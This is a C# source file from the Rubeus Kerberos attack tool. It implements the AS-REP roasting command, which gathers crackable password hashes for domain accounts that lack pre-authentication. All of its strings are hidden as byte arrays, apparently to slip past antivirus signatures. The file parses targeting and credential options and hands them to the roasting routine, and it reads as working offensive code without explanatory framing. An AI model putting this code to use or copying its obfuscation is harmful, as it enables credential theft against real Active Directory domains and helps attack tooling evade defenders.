using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;


namespace Rubeus.Commands
{
    public class Asreproast : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 97, 115, 114, 101, 112, 114, 111, 97, 115, 116 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string user = S(new byte[] {});
            string domain = S(new byte[] {});
            string dc = S(new byte[] {});
            string ou = S(new byte[] {});
            string format = S(new byte[] { 106, 111, 104, 110 });
            string ldapFilter = S(new byte[] {});
            string supportedEType = S(new byte[] { 114, 99, 52 });
            string outFile = S(new byte[] {});
            bool ldaps = false;
            System.Net.NetworkCredential cred = null;

            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                string[] parts = arguments[S(new byte[] { 47, 117, 115, 101, 114 })].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117 })))
            {
                ou = arguments[S(new byte[] { 47, 111, 117 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 100, 97, 112, 102, 105, 108, 116, 101, 114 })))
            {
                // additional LDAP targeting filter
                ldapFilter = arguments[S(new byte[] { 47, 108, 100, 97, 112, 102, 105, 108, 116, 101, 114 })].Trim('"').Trim('\'');
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 102, 111, 114, 109, 97, 116 })))
            {
                format = arguments[S(new byte[] { 47, 102, 111, 114, 109, 97, 116 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outFile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 108, 100, 97, 112, 115 })))
            {
                ldaps = true;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115 })))
            {
                supportedEType = S(new byte[] { 97, 101, 115 });
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 115 })))
            {
                supportedEType = S(new byte[] { 100, 101, 115 });
            }

            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })))
            {
                if (!Regex.IsMatch(arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 32, 115, 112, 101, 99, 105, 102, 105, 99, 97, 116, 105, 111, 110, 32, 109, 117, 115, 116, 32, 98, 101, 32, 105, 110, 32, 102, 113, 100, 110, 32, 102, 111, 114, 109, 97, 116, 32, 40, 100, 111, 109, 97, 105, 110, 46, 99, 111, 109, 92, 117, 115, 101, 114, 41, 13, 10 }));
                    return;
                }

                string[] parts = arguments[S(new byte[] { 47, 99, 114, 101, 100, 117, 115, 101, 114 })].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                if (!arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100, 32, 105, 115, 32, 114, 101, 113, 117, 105, 114, 101, 100, 32, 119, 104, 101, 110, 32, 115, 112, 101, 99, 105, 102, 121, 105, 110, 103, 32, 47, 99, 114, 101, 100, 117, 115, 101, 114, 13, 10 }));
                    return;
                }

                string password = arguments[S(new byte[] { 47, 99, 114, 101, 100, 112, 97, 115, 115, 119, 111, 114, 100 })];

                cred = new System.Net.NetworkCredential(userName, password, domainName);
            }
            Roast.ASRepRoast(domain, user, ou, dc, format, cred, outFile, ldapFilter, ldaps, supportedEType);
        }
    }
}